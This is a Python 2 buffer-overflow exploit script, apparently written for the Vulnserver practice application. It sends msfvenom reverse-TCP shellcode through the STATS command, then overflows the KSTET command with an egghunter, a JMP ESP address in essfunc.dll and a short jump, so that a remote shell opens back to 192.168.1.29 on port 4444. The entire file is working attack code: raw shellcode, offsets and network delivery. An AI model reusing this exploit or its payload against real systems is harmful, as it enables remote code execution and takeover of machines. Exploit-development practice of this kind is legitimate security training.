#!/usr/bin/python

import os
import sys
import socket

# JMP ESP: 625011AF 
# JMP SHORT: 62501164

# msfvenom --platform windows -a x86 -p windows/shell_reverse_tcp LHOST=192.168.1.29 LPORT=4444 EXITFUNC=thread -b "\x00" -f c
shellcode = (
"W00TW00T"
"\xbf\xbe\x0f\x1d\x79\xdb\xca\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x52\x31\x78\x12\x03\x78\x12\x83\x7e\x0b\xff\x8c\x82\xfc\x7d"
"\x6e\x7a\xfd\xe1\xe6\x9f\xcc\x21\x9c\xd4\x7f\x92\xd6\xb8\x73"
"\x59\xba\x28\x07\x2f\x13\x5f\xa0\x9a\x45\x6e\x31\xb6\xb6\xf1"
"\xb1\xc5\xea\xd1\x88\x05\xff\x10\xcc\x78\xf2\x40\x85\xf7\xa1"
"\x74\xa2\x42\x7a\xff\xf8\x43\xfa\x1c\x48\x65\x2b\xb3\xc2\x3c"
"\xeb\x32\x06\x35\xa2\x2c\x4b\x70\x7c\xc7\xbf\x0e\x7f\x01\x8e"
"\xef\x2c\x6c\x3e\x02\x2c\xa9\xf9\xfd\x5b\xc3\xf9\x80\x5b\x10"
"\x83\x5e\xe9\x82\x23\x14\x49\x6e\xd5\xf9\x0c\xe5\xd9\xb6\x5b"
"\xa1\xfd\x49\x8f\xda\xfa\xc2\x2e\x0c\x8b\x91\x14\x88\xd7\x42"
"\x34\x89\xbd\x25\x49\xc9\x1d\x99\xef\x82\xb0\xce\x9d\xc9\xdc"
"\x23\xac\xf1\x1c\x2c\xa7\x82\x2e\xf3\x13\x0c\x03\x7c\xba\xcb"
"\x64\x57\x7a\x43\x9b\x58\x7b\x4a\x58\x0c\x2b\xe4\x49\x2d\xa0"
"\xf4\x76\xf8\x67\xa4\xd8\x53\xc8\x14\x99\x03\xa0\x7e\x16\x7b"
"\xd0\x81\xfc\x14\x7b\x78\x97\xda\xd4\x83\x7a\xb3\x26\x83\x95"
"\x1f\xae\x65\xff\x8f\xe6\x3e\x68\x29\xa3\xb4\x09\xb6\x79\xb1"
"\x0a\x3c\x8e\x46\xc4\xb5\xfb\x54\xb1\x35\xb6\x06\x14\x49\x6c"
"\x2e\xfa\xd8\xeb\xae\x75\xc1\xa3\xf9\xd2\x37\xba\x6f\xcf\x6e"
"\x14\x8d\x12\xf6\x5f\x15\xc9\xcb\x5e\x94\x9c\x70\x45\x86\x58"
"\x78\xc1\xf2\x34\x2f\x9f\xac\xf2\x99\x51\x06\xad\x76\x38\xce"
"\x28\xb5\xfb\x88\x34\x90\x8d\x74\x84\x4d\xc8\x8b\x29\x1a\xdc"
"\xf4\x57\xba\x23\x2f\xdc\xda\xc1\xe5\x29\x73\x5c\x6c\x90\x1e"
"\x5f\x5b\xd7\x26\xdc\x69\xa8\xdc\xfc\x18\xad\x99\xba\xf1\xdf"
"\xb2\x2e\xf5\x4c\xb2\x7a")

# 32 bit egghunter shellcode
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a"
"\x74\xef\xb8\x57\x30\x30\x54\x89\xd7\xaf\x75\xea\xaf\x75\xe7"
"\xff\xe7")

payload = ''
payload += 'A' * 26 
payload += egghunter 
payload += 'A' * (70-len(payload)) 
payload += '\xAF\x11\x50\x62' #JMP ESP in essfunc.dll
payload += '\xEB\xCE' # Short jump back into buffer 50 bytes and land exactly on egghunter
payload += 'C' * (1000 - len(payload))

# Send 2nd stage shellcode payload into memory using the STATS command
connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect.connect(('192.168.1.30',9999))
print connect.recv(1024)
connect.send('STATS ' + shellcode + '\r\n')
print connect.recv(1024)
connect.close()

# Send the 1st stage payload to the KSTET command
connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect.connect(('192.168.1.30',9999))
print connect.recv(1024)
connect.send('KSTET ' + payload + '\r\n')
connect.recv(1024)
connect.close()